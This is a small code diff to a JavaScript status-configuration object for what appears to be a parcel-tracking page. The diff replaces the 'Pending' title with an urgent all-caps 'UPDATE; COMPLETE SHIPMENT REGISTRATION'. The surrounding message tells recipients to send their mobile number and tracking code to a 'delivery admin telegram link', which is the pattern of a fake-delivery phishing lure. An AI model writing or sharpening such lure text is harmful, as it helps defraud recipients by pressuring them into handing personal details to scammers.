@@ -70,7 +70,7 @@ const STATUS_CONFIG = {
   Pending: {
     color: "#f59e0b",
     bgColor: "#fef3c7",
-    title: "Package Status: Pending - Action Needed",
+    title: "UPDATE; COMPLETE SHIPMENT REGISTRATION",
     message:
       "Your Parcel is currently pending and requires attention. Please forward your mobile number and tracking code to the delivery admin telegram link below to complete and confirm your shipping registration.",
     urgency: "medium",
